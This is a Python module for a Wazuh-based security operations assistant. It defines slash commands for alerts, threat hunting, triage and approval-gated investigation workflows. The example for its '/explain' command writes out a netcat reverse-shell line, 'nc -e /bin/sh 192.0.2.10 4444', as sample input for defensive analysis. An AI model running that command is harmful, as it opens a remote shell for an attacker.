"""Single source of truth for assistant capabilities and slash autocomplete."""

from app.soc_assistant.schemas import AssistantCommand, AssistantCommandName


COMMANDS = (
    AssistantCommand(
        name=AssistantCommandName.CHAT,
        slash="/ask",
        aliases=["/question"],
        title="Ask the SOC analyst",
        description=(
            "Ask a read-only SOC question using bounded conversation and "
            "workflow context."
        ),
        usage="/ask <question>",
        category="Analyze",
        examples=[
            "/ask What does this finding mean?",
            "/ask How should I remediate this alert?",
        ],
    ),
    AssistantCommand(
        name=AssistantCommandName.ALERTS,
        slash="/alerts",
        aliases=["/alert", "/recent"],
        title="Get Wazuh alerts",
        description="Return compact correlated Wazuh findings without starting remediation.",
        usage=(
            "/alerts [--new|--open|--all] [--since 15m] "
            "[--severity high] [--hours 24] [--min-level 7] "
            "[--limit 20] [--agent 001] [text]"
        ),
        category="Monitor",
        examples=["/alerts --min-level 10", "/alerts ssh --hours 6"],
    ),
    AssistantCommand(
        name=AssistantCommandName.SUMMARY,
        slash="/summary",
        aliases=["/overview"],
        title="Alert overview",
        description="Show Wazuh alert counts and distributions for a time window.",
        usage="/summary [--hours 24]",
        category="Monitor",
        examples=["/summary", "/summary --hours 6"],
    ),
    AssistantCommand(
        name=AssistantCommandName.HUNT,
        slash="/hunt",
        aliases=["/threat-hunt", "/ioc"],
        title="Threat hunt",
        description="Search bounded Wazuh alert and archive telemetry for one indicator.",
        usage="/hunt <indicator> [--type ip|domain|hash|process|user|path|other] [--hours 24] [--agent 001]",
        category="Investigate",
        examples=["/hunt 192.0.2.10 --type ip", "/hunt powershell.exe --type process"],
    ),
    AssistantCommand(
        name=AssistantCommandName.TRIAGE,
        slash="/triage",
        aliases=["/findings"],
        title="Triage findings",
        description="Group recent Wazuh alerts into findings with an evidence-backed verdict.",
        usage="/triage [--hours 24] [--min-level 7] [--limit 20]",
        category="Monitor",
        examples=["/triage --min-level 10", "/triage --hours 6"],
    ),
    AssistantCommand(
        name=AssistantCommandName.INVESTIGATE,
        slash="/investigate",
        aliases=["/mapek", "/workflow"],
        title="Run full MAPE-K workflow",
        description="Start the controlled investigation, policy, approval, execution, and verification workflow.",
        usage="/investigate <alert-id> [--agent 001]",
        category="Respond",
        examples=["/investigate alert-document-id --agent 001"],
    ),
    AssistantCommand(
        name=AssistantCommandName.STATUS,
        slash="/status",
        aliases=["/investigation"],
        title="Investigation status",
        description="Load the latest durable MAPE-K state and pending approval stage.",
        usage="/status <investigation-id>",
        category="Investigate",
        examples=["/status INV-ABC123"],
    ),
    AssistantCommand(
        name=AssistantCommandName.PLAN,
        slash="/plan",
        aliases=["/investigation-plan"],
        title="Review the investigation plan",
        description=(
            "Show the evidence-bound plan already produced by the controlled "
            "workflow; this command never invents or executes a plan."
        ),
        usage="/plan <investigation-id>",
        category="Investigate",
        examples=["/plan INV-ABC123"],
    ),
    AssistantCommand(
        name=AssistantCommandName.COLLECT,
        slash="/collect",
        aliases=["/collect-evidence"],
        title="Collect more evidence",
        description=(
            "Resume an inconclusive escalated investigation at Monitor, then "
            "run Analyze again in the same durable workflow."
        ),
        usage="/collect <investigation-id>",
        category="Investigate",
        examples=["/collect INV-ABC123"],
    ),
    AssistantCommand(
        name=AssistantCommandName.CONTINUE,
        slash="/continue",
        aliases=["/resume"],
        title="Continue the controlled workflow",
        description=(
            "Continue the same durable investigation without skipping Analyze, "
            "policy, approval, execution authorization, or verification."
        ),
        usage="/continue <investigation-id>",
        category="Respond",
        examples=["/continue INV-ABC123"],
    ),
    AssistantCommand(
        name=AssistantCommandName.HEALTH,
        slash="/health",
        aliases=["/connections"],
        title="SOC service health",
        description="Check Wazuh manager and indexer connectivity.",
        usage="/health",
        category="System",
        examples=["/health"],
    ),
    AssistantCommand(
        name=AssistantCommandName.EXPLAIN,
        slash="/explain",
        aliases=["/explain-command"],
        title="Explain a command line",
        description=(
            "Analyze an untrusted command line as data and explain its "
            "behavior, risk, indicators, and defensive checks."
        ),
        usage="/explain <command-line>",
        category="Analyze",
        examples=["/explain nc -e /bin/sh 192.0.2.10 4444"],
    ),
    AssistantCommand(
        name=AssistantCommandName.HELP,
        slash="/help",
        aliases=["/?", "/commands"],
        title="Command help",
        description="List available SOC assistant capabilities.",
        usage="/help",
        category="System",
        examples=["/help"],
    ),
)

COMMAND_BY_SLASH = {
    slash: command
    for command in COMMANDS
    for slash in (command.slash, *command.aliases)
}


def public_catalog() -> list[dict]:
    return [command.model_dump(mode="json") for command in COMMANDS]
